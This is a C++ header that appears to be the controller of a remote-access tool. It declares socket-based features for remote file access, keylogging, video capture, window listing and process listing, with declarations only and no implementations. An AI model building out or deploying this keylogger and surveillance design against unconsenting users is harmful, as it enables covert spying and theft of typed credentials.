#pragma once
#include <atomic>
#include <cstdint>
#include <string>
#include <unordered_map>
#include <vector>
#include <winsock2.h>

#include "imgui.h"

struct PacketHeader {
    uint32_t packet_size;
    uint16_t request_id;
    uint8_t  request_type;
    uint8_t  request_key;
};

struct ResponseHeader {
    uint32_t packageSize;
    uint16_t responseID;
    uint16_t statusCode;
};

class Feature {
protected:
    char* m_IP = nullptr;
    const int requestKey;
    int sendRequest(SOCKET sock,int type, int size, char *data);
    int receiveResponse(SOCKET sock,int &size, char **data);
    SOCKET init();
    std::atomic_int returnValue = 0;
public:
    struct RequestParam {
        int type;
        int size;
        char *data;
        int saveFileSize = 0;
        char *saveFilePath = nullptr;
    };
    Feature(char* IP, int key) : requestKey(key) {
        m_IP = strdup(IP);
    }
    virtual ~Feature() = default;
    virtual int requestingFeature(RequestParam rParam) = 0;
    int getReturnedValue() const {
        return returnValue.load();
    }
};

class FileFeature: public Feature {
public:
    FileFeature(char* IP)
        : Feature(IP, 0x03) {
    }

    int requestingFeature(RequestParam rParam) override;
};

class KeyloggerFeature: public Feature {
    std::atomic_bool isKeyloggerRunning = false;
    std::mutex m_mutex;
    std::string keyloggingValue;
public:
    KeyloggerFeature(char* IP)
        : Feature(IP, 0x01) {
    }
    int requestingFeature(RequestParam rParam) override;
    bool isRunning() const;

    std::string getLogging();
};

class VideoFeature: public Feature {
public:
    VideoFeature(char* IP)
        : Feature(IP, 0x02) {
    }
    int requestingFeature(RequestParam rParam) override;
};

class WindowFeature: public Feature {
public:
    WindowFeature(char* IP)
        : Feature(IP, 0x04) {
    }

    int requestingFeature(RequestParam rParam) override;
};

class ProcessFeature: public Feature {
    static std::unordered_map<DWORD, bool> m_selectedProcesses;
public:
    struct ProcessInfoNode {
        DWORD PID;
        char *Name;
        DWORD ParentPID;
        SIZE_T MemoryUsage;
        ULONGLONG CPUTimeUser;
        int childCount = 0;
        ProcessInfoNode **children = nullptr;
        static void DisplayNode(const ProcessInfoNode *node);

        ProcessInfoNode(DWORD pid, const char *name, DWORD parentPID, SIZE_T memoryUsage, ULONGLONG cpuTimeUser);

        ~ProcessInfoNode();

        void addChild(ProcessInfoNode *child);
    };
private:
    std::mutex m_mutex;
    std::unordered_map<DWORD, ProcessInfoNode*> m_allNodes;
public:
    ProcessFeature(char* IP): Feature(IP, 0x00) {};

    int requestingFeature(RequestParam rParam) override;

    std::unordered_map<DWORD, ProcessInfoNode*> getProcessList();

    static std::vector<DWORD> getSelectedProcesses();

    static bool isAnyProcessSelected();
};